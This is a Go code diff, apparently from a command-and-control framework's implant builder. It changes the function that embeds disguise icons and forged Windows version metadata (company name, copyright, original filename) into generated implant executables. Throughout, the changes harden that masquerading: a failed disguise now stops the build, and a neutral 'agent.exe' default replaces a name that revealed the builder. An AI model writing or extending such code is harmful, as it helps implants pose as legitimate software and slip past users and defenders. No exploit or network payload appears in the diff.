@@ -106,13 +106,16 @@ func generateSolidPNG(r, g, b uint8) []byte {
 // injectIconResource creates a Windows resource file (rsrc.syso) in tmpDir
 // if cfg requests a custom icon (IconB64) or a disguise preset. It uses
 // winres to encode RT_ICON / RT_GROUP_ICON. No-op when cfg has no icon
-// request. Errors are logged but not fatal — the build will proceed with the
-// default Go icon.
-func injectIconResource(tmpDir string, cfg ImplantConfig) error {
+// request. A requested icon/preset/disguise that cannot be embedded is an
+// error: the operator selected it explicitly and the generator must not
+// silently fall back to the default Go icon.
+func injectIconResource(tmpDir string, cfg ImplantConfig, originalName string) error {
 	iconB64 := cfg.IconB64
 	preset := cfg.IconPreset
 	disguise := cfg.DisguiseAs
-	if iconB64 == "" && preset == "" && disguise == "" {
+	hasVersionInfo := cfg.FileDescription != "" || cfg.CompanyName != ""
+	hasManifest := cfg.PEManifestMode == "blend"
+	if iconB64 == "" && preset == "" && disguise == "" && !hasVersionInfo && !hasManifest {
 		return nil
 	}
 	var iconData []byte
@@ -151,6 +154,17 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 			}
 		}
 	}
+	if len(iconData) == 0 {
+		if iconB64 != "" {
+			return fmt.Errorf("icon data could not be decoded")
+		}
+		if preset != "" {
+			return fmt.Errorf("icon preset %q is unavailable", preset)
+		}
+		if disguise != "" {
+			return fmt.Errorf("disguise icon for %q is unavailable", disguise)
+		}
+	}
 	// Prepare resource set early for VersionInfo even if icon is missing
 	rs := &winres.ResourceSet{}
 	// VersionInfo: honor FileDescription / CompanyName if supplied; otherwise derive from disguise with realistic version numbers
@@ -181,26 +195,40 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 		vi.FileVersion = fv
 		vi.ProductVersion = pv
 		// vi.Set only fails on empty keys or NUL bytes (rejected upstream by
-		// profile validation); surface the first failure instead of shipping
-		// a half-written VERSIONINFO silently.
-		setVer := func(key, value string) {
+		// profile validation); a failure here would ship a half-written
+		// VERSIONINFO, so treat it as a build error.
+		setVer := func(key, value string) error {
 			if err := vi.Set(version.LangDefault, key, value); err != nil {
-				fmt.Printf("versioninfo warning: key %q: %v\n", key, err)
+				return fmt.Errorf("versioninfo %s: %w", key, err)
+			}
+			return nil
+		}
+		for _, kv := range [][2]string{
+			{version.FileDescription, fd},
+			{version.CompanyName, cn},
+			{version.ProductName, fd},
+			{version.FileVersion, fvStr},
+			{version.ProductVersion, pvStr},
+			{version.LegalCopyright, "© " + cn},
+		} {
+			if err := setVer(kv[0], kv[1]); err != nil {
+				return err
 			}
 		}
-		setVer(version.FileDescription, fd)
-		setVer(version.CompanyName, cn)
-		setVer(version.ProductName, fd)
-		setVer(version.FileVersion, fvStr)
-		setVer(version.ProductVersion, pvStr)
-		setVer(version.LegalCopyright, "© "+cn)
-		// OriginalFilename should match the disguised output name for maximal realism
-		orig := ApplyDisguiseFilename(safeBuildFileName(cfg.Filename), disguise)
+		// OriginalFilename is the operator-visible name, before the server's
+		// uniqueness prefix. Falling back to the prefixed output name is a
+		// last resort for direct generator callers; the neutral default avoids
+		// advertising the builder in metadata.
+		orig := safeBuildFileName(originalName)
 		if orig == "" {
-			orig = "forgec2_agent.exe"
+			orig = "agent.exe"
 		}
-		setVer(version.OriginalFilename, orig)
-		setVer(version.InternalName, fd)
+		if err := setVer(version.OriginalFilename, orig); err != nil {
+			return err
+		}
+		if err := setVer(version.InternalName, fd); err != nil {
+			return err
+		}
 		rs.SetVersionInfo(vi)
 		// Icon-less builds still emit an rsrc.syso carrying VersionInfo (set
 		// above); no icon entry is needed when there is nothing to embed.
